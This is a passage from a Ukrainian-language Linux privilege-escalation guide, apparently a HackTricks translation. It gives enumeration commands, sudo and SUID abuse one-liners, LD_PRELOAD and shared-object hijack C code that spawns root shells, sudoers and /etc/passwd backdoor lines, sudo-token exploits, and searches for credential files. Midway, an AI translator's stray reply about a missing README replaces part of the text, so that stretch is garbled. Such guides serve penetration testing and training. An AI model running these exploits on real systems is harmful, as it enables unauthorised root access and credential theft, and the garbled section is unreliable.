(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Відкриті порти

Завжди перевіряйте мережеві сервіси, що працюють на машині, з якими ви не могли взаємодіяти до отримання доступу:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Перевірте, чи можете sniff traffic. Якщо так, ви зможете отримати деякі credentials.
```
timeout 1 tcpdump
```
## Користувачі

### Generic Enumeration

Перевірте, **who** ви, які у вас **privileges**, які **users** є в системах, хто може **login** і хто має **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Великий UID

Деякі версії Linux були уражені багом, який дозволяє користувачам з **UID > INT_MAX** ескалювати привілеї. Детальніше: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Експлуатувати** за допомогою: **`systemd-run -t /bin/bash`**

### Групи

Перевірте, чи є ви **членом якоїсь групи**, яка може надати вам root-привілеї:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Буфер обміну

Перевірте, чи є в буфері обміну щось цікаве (якщо можливо)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Політика паролів
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Відомі паролі

Якщо ви **знаєте будь-який пароль** середовища, **спробуйте увійти під кожним користувачем**, використовуючи цей пароль.

### Su Brute

Якщо вас не бентежить великий шум і на комп'ютері присутні бінарні файли `su` та `timeout`, ви можете спробувати brute-force користувача за допомогою [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) з параметром `-a` також намагається brute-force користувачів.

## Зловживання записом у $PATH

### $PATH

Якщо ви виявите, що можете **записувати в якусь папку з $PATH**, ви можете підвищити привілеї, **створивши backdoor у записуваній папці** з іменем якоїсь команди, яка буде виконуватися іншим користувачем (ідеально — root), і яка **не завантажується з папки, що знаходиться раніше** за вашу записувану папку в $PATH.

### SUDO and SUID

Вам може бути дозволено виконувати якусь команду за допомогою sudo або вона може мати suid bit. Перевірте це за допомогою:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Деякі **непередбачувані команди дозволяють читати і/або записувати файли або навіть виконувати команду.** Наприклад:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Конфігурація Sudo може дозволити користувачу виконати команду з привілеями іншого користувача без знання пароля.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
У цьому прикладі користувач `demo` може запускати `vim` як `root`; тепер отримати shell тривіально — додавши ssh key у каталог root або викликавши `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ця директива дозволяє користувачеві **встановити змінну середовища** під час виконання чогось:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Цей приклад, **based on HTB machine Admirer**, був **вразливий** до **PYTHONPATH hijacking**, що дозволяв завантажити довільну python бібліотеку під час виконання скрипта від імені root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV збережено через sudo env_keep → root shell

Якщо sudoers зберігає `BASH_ENV` (наприклад, `Defaults env_keep+="ENV BASH_ENV"`), ви можете скористатися поведінкою Bash при неінтерактивному запуску, щоб виконати довільний код як root при виклику дозволеної команди.

- Чому це працює: Для неінтерактивних оболонок Bash оцінює `$BASH_ENV` і підвантажує цей файл перед виконанням цільового скрипту. Багато правил sudo дозволяють запускати скрипт або shell wrapper. Якщо `BASH_ENV` збережено в `env_keep`, ваш файл буде підвантажений з root-привілеями.

- Вимоги:
- Правило sudo, яке ви можете виконати (будь-яка ціль, що викликає `/bin/bash` у неінтерактивному режимі, або будь-який bash script).
- `BASH_ENV` присутній у `env_keep` (перевірте за допомогою `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Зміцнення:
- Видаліть `BASH_ENV` (і `ENV`) з `env_keep`, надавайте перевагу `env_reset`.
- Уникайте shell wrappers для sudo-allowed команд; використовуйте minimal binaries.
- Розгляньте sudo I/O logging і alerting, коли використовуються preserved env vars.

### Шляхи обходу виконання sudo

**Jump** щоб прочитати інші файли або використати **symlinks**. Наприклад у sudoers файлі: _hacker10 ALL= (root) /bin/less /var/log/*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Якщо використовується **wildcard** (\*), то це ще простіше:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary без шляху до команди

Якщо **sudo permission** надано для однієї команди **без вказування шляху**: _hacker10 ALL= (root) less_, ви можете exploit її, змінивши змінну PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Цю техніку також можна використати, якщо **suid** бінарний файл **виконує іншу команду без вказання її шляху (завжди перевіряйте за допомогою** _**strings**_ **вміст дивного SUID бінарного файлу)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID бінарний файл з вказаним шляхом до команди

Якщо **suid** бінарний файл **виконує іншу команду, вказуючи шлях**, тоді ви можете спробувати **export a function** з іменем тієї команди, яку викликає suid файл.

Наприклад, якщо suid бінарний файл викликає _**/usr/sbin/service apache2 start**_ вам потрібно спробувати створити функцію та експортувати її:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Коли ви викликаєте suid binary, ця функція буде виконана

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна оточення **LD_PRELOAD** використовується для вказання однієї або кількох shared libraries (.so files), які завантажуються loader'ом перед усіма іншими, включно зі стандартною C library (`libc.so`). Цей процес відомий як preloading a library.

Однак, щоб підтримувати безпеку системи та запобігти використанню цієї можливості злоумисниками, особливо щодо **suid/sgid** executables, система накладає певні умови:

- Завантажувач ігнорує **LD_PRELOAD** для executables, де real user ID (_ruid_) не збігається з effective user ID (_euid_).
- Для executables з **suid/sgid**, попередньо завантажуються лише бібліотеки в стандартних шляхах, які також є **suid/sgid**.

Ескалація привілеїв може статися, якщо ви можете виконувати команди з `sudo`, і вивід `sudo -l` містить рядок **env_keep+=LD_PRELOAD**. Така конфігурація дозволяє змінній оточення **LD_PRELOAD** зберігатися і бути розпізнаною навіть під час виконання команд через `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.
```
Defaults        env_keep += LD_PRELOAD
```
Збережіть як **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Потім **скомпілюйте його** використовуючи:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Нарешті, **escalate privileges** виконуючи
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Подібний privesc може бути використаний, якщо attacker контролює **LD_LIBRARY_PATH** env variable, оскільки він контролює шлях, де будуть шукатися бібліотеки.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Коли зустрічаєте binary з правами **SUID**, які здаються підозрілими, корисно перевірити, чи він правильно завантажує файли **.so**. Це можна перевірити, виконавши наступну команду:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Наприклад, поява помилки на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ свідчить про потенційну можливість експлуатації.

Щоб експлуатувати це, слід створити C file, наприклад _"/path/to/.config/libcalc.c"_, який містить наступний код:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Цей код, після компіляції та виконання, має на меті підвищити привілеї шляхом маніпуляції правами доступу до файлів та запуску shell з підвищеними привілеями.

Скомпілюйте наведений вище C-файл у shared object (.so) файл за допомогою:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Нарешті, запуск ураженого SUID binary повинен спровокувати exploit, що може призвести до потенційного system compromise.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Тепер, коли ми знайшли SUID binary, що завантажує library з folder, куди ми можемо записувати, давайте створимо library у цій folder з необхідною назвою:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Якщо ви отримуєте помилку, таку як
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
це означає, що створена вами бібліотека повинна мати функцію з назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це кураторський список Unix-бінарних файлів, які може використати зловмисник для обходу локальних обмежень безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те ж саме, але для випадків, коли ви можете **лише інжектувати аргументи** в команду.

Проєкт збирає легітимні функції Unix binaries, які можуть бути використані для break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо ви маєте доступ до `sudo -l`, ви можете використати інструмент [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) щоб перевірити, чи він знаходить спосіб експлуатувати будь-яке правило sudo.

### Повторне використання sudo Tokens

У випадках, коли у вас є **sudo access**, але немає пароля, ви можете підняти привілеї, **чекаючи виконання команди sudo і перехопивши сесійний токен**.

Вимоги для підвищення привілеїв:

- У вас вже є shell як користувач "_sampleuser_"
- "_sampleuser_" використав **`sudo`** для виконання чогось в **останні 15mins** (за замовчуванням це тривалість sudo token, який дозволяє нам використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` має значення 0
- `gdb` доступний (ви можете завантажити його)

(Ви можете тимчасово ввімкнути `ptrace_scope` за допомогою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або назавжди змінивши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`)

Якщо всі ці вимоги виконані, **ви можете підняти привілеї, використовуючи:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **другий exploit** (`exploit_v2.sh`) створить sh shell у _/tmp_ **який належить root і має setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Цей **третій exploit** (`exploit_v3.sh`) **створить sudoers file**, який **зробить sudo tokens вічними і дозволить усім користувачам використовувати sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Якщо у вас є **write permissions** у папці або на будь‑якому з файлів, створених у ній, ви можете використати бінарний файл [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) щоб **create a sudo token for a user and PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і маєте shell від імені цього користувача з PID 1234, ви можете **obtain sudo privileges** без потреби знати пароль, виконавши:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` та файли всередині `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як. Ці файли **за замовчуванням можуть читатися лише користувачем root і групою root**.\
**Якщо** ви можете **прочитати** цей файл, ви зможете **отримати деяку цікаву інформацію**, а якщо ви можете **записати** будь-який файл, ви зможете **escalate privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Якщо у вас є дозвіл на запис, ви можете зловживати ним.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Інший спосіб зловживати цими дозволами:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Існують деякі альтернативи бінарному файлу `sudo`, такі як `doas` для OpenBSD; не забудьте перевірити його конфігурацію в `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини та використовує `sudo`** для підвищення привілеїв і ви отримали shell у контексті цього користувача, ви можете **створити новий sudo executable**, який виконуватиме ваш код як root, а потім команду користувача. Потім **змініть $PATH** у контексті користувача (наприклад, додавши новий шлях у .bash_profile), щоб коли користувач виконає sudo, був виконаний ваш sudo executable.

Зауважте, що якщо користувач використовує інший shell (не bash) вам потрібно змінити інші файли, щоб додати новий шлях. Наприклад[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Інший приклад можна знайти в [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або запустивши щось на кшталт:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує **звідки беруться завантажені файли конфігурації**. Зазвичай цей файл містить наступний рядок: `include /etc/ld.so.conf.d/*.conf`

Це означає, що будуть зчитані файли конфігурації з `/etc/ld.so.conf.d/*.conf`. Ці файли конфігурації **вказують на інші папки**, де **бібліотеки** будуть **шукатися**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — `/usr/local/lib`. **Це означає, що система буде шукати бібліотеки всередині `/usr/local/lib`**.

Якщо з якоїсь причини **користувач має права на запис** на будь-якому з вказаних шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-якому файлі всередині `/etc/ld.so.conf.d/` або будь-якій папці, вказаній у файлі конфігурації `/etc/ld.so.conf.d/*.conf` він може отримати escalate privileges.\  
Перегляньте **how to exploit this misconfiguration** на наступній сторінці:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Копіюючи lib у `/var/tmp/flag15/`, вона буде використана програмою в цьому місці, як вказано в змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку у `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Linux capabilities надають **підмножину доступних привілеїв root для процесу**. Це фактично розбиває привілеї root на **менші й відокремлені одиниці**. Кожну з цих одиниць можна незалежно надавати процесам. Таким чином повний набір привілеїв зменшується, що знижує ризики експлуатації.\
Прочитайте наступну сторінку, щоб **дізнатися більше про capabilities і як ними зловживати**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Права доступу до директорії

В у директорії **біт для "execute"** означає, що відповідний користувач може "**cd**" у папку.\
**"read"** біт означає, що користувач може **list** **the files**, а **"write"** біт означає, що користувач може **delete** та **create** нові **files**.

## ACLs

Access Control Lists (ACLs) представляють собою вторинний рівень дискреційних прав, здатний **перекривати традиційні ugo/rwx permissions**. Ці права посилюють контроль доступу до файлів або директорій, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або не належать до групи. Такий рівень **гранулярності забезпечує більш точне керування доступом**. Більш детальна інформація доступна [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Надайте** користувачу "kali" read і write permissions над файлом:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACLs з системи:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Відкриті shell-сесії

У **старих версіях** ви можете **hijack** деяку **shell** сесію іншого користувача (**root**).\
У **новіших версіях** ви зможете **connect** лише до screen сесій **власного користувача**. Однак ви можете знайти **цікаву інформацію всередині сесії**.

### screen sessions hijacking

**Перелічити screen сесії**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Це була проблема з **old tmux versions**. Я не зміг hijack tmux (v2.1) session, створену root, коли був непривілейованим користувачем.

**Список tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Підключитися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Усі SSL та SSH keys, згенеровані на системах на базі Debian (Ubuntu, Kubuntu тощо) між вереснем 2006 і 13 травня 2008 можуть бути вразливі через цю помилку.\
Ця помилка виникає при створенні нового ssh key в цих ОС, бо **було можливих лише 32,768 варіантів**. Це означає, що всі можливості можна перерахувати і, маючи ssh public key, ви можете шукати відповідний private key. Ви можете знайти розраховані можливості тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Вказує, чи дозволена автентифікація паролем. За замовчуванням — `no`.
- **PubkeyAuthentication:** Вказує, чи дозволена автентифікація за public key. За замовчуванням — `yes`.
- **PermitEmptyPasswords**: Коли дозволена автентифікація паролем, вказує, чи сервер дозволяє вхід в акаунти з порожніми рядками пароля. За замовчуванням — `no`.

### PermitRootLogin

Вказує, чи може root увійти за допомогою ssh, за замовчуванням — `no`. Можливі значення:

- `yes`: root може увійти, використовуючи пароль та private key
- `without-password` or `prohibit-password`: root може увійти тільки за допомогою private key
- `forced-commands-only`: root може увійти лише використовуючи private key і якщо вказані опції commands
- `no` : ні

### AuthorizedKeysFile

Вказує файли, які містять public keys, які можна використовувати для автентифікації користувача. Він може містити токени на кшталт `%h`, які будуть замінені на home directory. **Ви можете вказувати absolute paths** (що починаються з `/`) або **relative paths від home користувача**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ця конфігурація вкаже, що якщо ви спробуєте увійти, використовуючи **private** key користувача "**testusername**", ssh порівняє public key вашого ключа з тими, що знаходяться в `/home/testusername/.ssh/authorized_keys` і `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **використовувати локальні SSH keys замість того, щоб залишати keys** (without passphrases!) на вашому сервері. Отже, ви зможете **jump** via ssh **to a host** і звідти **jump to another** host **using** the **key** розташований на вашому **initial host**.

Вам потрібно встановити цю опцію в `$HOME/.ssh.config` так:
```
Host example.com
ForwardAgent yes
```
Зверніть увагу: якщо `Host` дорівнює `*`, то щоразу, коли користувач підключається до іншої машини, ця машина зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перевизначати** ці **опції** та дозволяти або забороняти цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** ssh-agent forwarding за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням — дозволено).

Якщо ви виявите, що Forward Agent налаштовано в середовищі, прочитайте наступну сторінку, оскільки **ви можете скористатися цим для ескалації привілеїв**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в каталозі `/etc/profile.d/` — це **скрипти, що виконуються при запуску користувачем нового shell**. Отже, якщо ви можете **записати або змінити будь-який із них, ви можете ескалювати привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено будь-який дивний скрипт профілю, його слід перевірити на **чутливі деталі**.

### Файли passwd/shadow

Залежно від ОС файли `/etc/passwd` та `/etc/shadow` можуть мати іншу назву або існувати як резервні копії. Тому рекомендується **знайти всі їхні екземпляри** та **перевірити, чи можете їх прочитати**, щоб дізнатися **чи є в файлах хеші**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
У деяких випадках у файлі `/etc/passwd` (або еквівалентному) можна знайти **password hashes**
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Доступний для запису /etc/passwd

Спочатку згенеруйте пароль за допомогою однієї з наведених команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Я не бачу вміст файлу src/linux-hardening/privilege-escalation/README.md. Надішліть, будь ласка, вміст файлу, який треба перекласти, або підтвердіть, що я можу отримати його самостійно.

Також уточніть, що саме ви маєте на увазі під "add the user `hacker` and add the generated password":
- Хочете, щоб я згенерував пароль і додав рядок з цими обліковими даними в перекладений README.md? (я можу створити випадковий пароль і вставити його у файл)
- Чи потрібно надати команди для додавання користувача на реальній системі (наприклад, useradd/adduser + echo "hacker:пароль" | chpasswd) — я не виконуватиму команди, але можу показати інструкції/команди, які ви виконаєте локально.

Напишіть, будь ласка:
1) Вміст README.md для перекладу, або дозвіл на його отримання.
2) Чи згенерувати пароль зараз? Якщо так, вкажіть бажану довжину/символи.
3) Чи вставити у файл лише рядок з обліковими даними, чи додати також інструкції для додавання користувача на системі.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використовувати команду `su` з обліковими даними `hacker:hacker`

Або ви можете використати наступні рядки, щоб додати фіктивного користувача без пароля.\
УВАГА: це може погіршити поточну безпеку машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На платформах BSD `/etc/passwd` знаходиться у `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано в `/etc/spwd.db`.

Вам слід перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в якийсь **файл конфігурації сервісу**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо машина запускає **tomcat** сервер і ви можете **modify the Tomcat service configuration file inside /etc/systemd/,** тоді ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### Перевірте папки

Наступні папки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Мабуть, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивне розташування/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB файли
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
